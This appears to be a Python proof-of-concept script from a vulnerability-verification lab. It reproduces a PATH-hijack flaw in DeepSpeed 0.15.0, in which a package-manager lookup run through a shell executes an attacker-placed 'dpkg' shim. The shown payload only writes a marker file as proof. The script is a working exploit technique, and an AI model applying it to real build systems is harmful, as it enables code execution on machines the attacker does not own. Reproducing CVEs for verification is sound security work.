"""CVE-2024-43497 dynamic reproduction (DeepSpeed 0.15.0).

The real root cause is ``AsyncIOBuilder.check_for_libaio_pkg``: it resolves a
package manager with ``distutils.spawn.find_executable`` and then runs
``subprocess.Popen(f"{pkgmgr} {flag} {lib}", shell=True)``.  An attacker who can
place a ``dpkg`` executable earlier in PATH gets code execution in the
DeepSpeed build process.

This PoC imports the pinned upstream ``op_builder.async_io``, prepends the
committed ``shim/`` directory (a pip console-script ``dpkg.exe`` plus a Python
module) to PATH, and calls the real method.
"""

from __future__ import annotations

import json
import os
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import poclib  # noqa: E402


def main() -> None:
    manifest = json.loads((poclib.CASE_DIR / "manifest.json").read_text(encoding="utf-8"))
    repo = Path(
        os.environ.get("UV_DEEPSPEED_SRC")
        or (poclib.REPO_ROOT / "lab/upstream_verify/.cache/deepspeed-v0.15.0")
    )
    if not (repo / "op_builder/async_io.py").is_file():
        poclib.fail("DeepSpeed source tree missing; run the install command from manifest.json", expected=str(repo))

    shim = poclib.upstream_path("lab/upstream_verify/upstream/deepspeed/0.15.0/shim")
    if not (shim / "dpkg.exe").is_file():
        poclib.fail(f"committed dpkg shim missing: {shim}")

    text = poclib.MARKER_TEXT
    marker = str(poclib.MARKER_FILE).replace("\\", "/")
    poclib.start_marker("PRE")

    sys.path.insert(0, str(repo))
    os.environ["PATH"] = str(shim) + os.pathsep + os.environ.get("PATH", "")
    os.environ["PYTHONPATH"] = str(shim) + os.pathsep + os.environ.get("PYTHONPATH", "")
    os.environ["DS_MARKER"] = marker
    os.environ["DS_TEXT"] = text

    from op_builder.async_io import AsyncIOBuilder

    builder = AsyncIOBuilder()
    found = builder.check_for_libaio_pkg()

    if not poclib.marker_ok():
        poclib.fail("dpkg PATH hijack did not execute", found=found)

    poclib.finish_verified(
        {
            "transport": {
                "type": "function+PATH-hijack",
                "entrypoint": "op_builder.async_io.AsyncIOBuilder.check_for_libaio_pkg",
                "source": poclib.rel(repo / "op_builder/async_io.py"),
                "shim": poclib.rel(shim / "dpkg.exe"),
                "path_prefix": poclib.rel(shim),
                "found": found,
                "command": "dpkg -l libaio-dev apt (shell=True)",
                "note": "find_executable returns the attacker shim on PATH; vulnerable command construction is upstream",
            },
            "request_response": [
                {
                    "dir": "PATH -> find_executable('dpkg') -> subprocess.Popen(shell=True)",
                    "result": "shim written marker and exited 0",
                }
            ],
            "state_before": "marker=PRE",
            "state_after": "marker contains proof text",
        }
    )


if __name__ == "__main__":
    main()
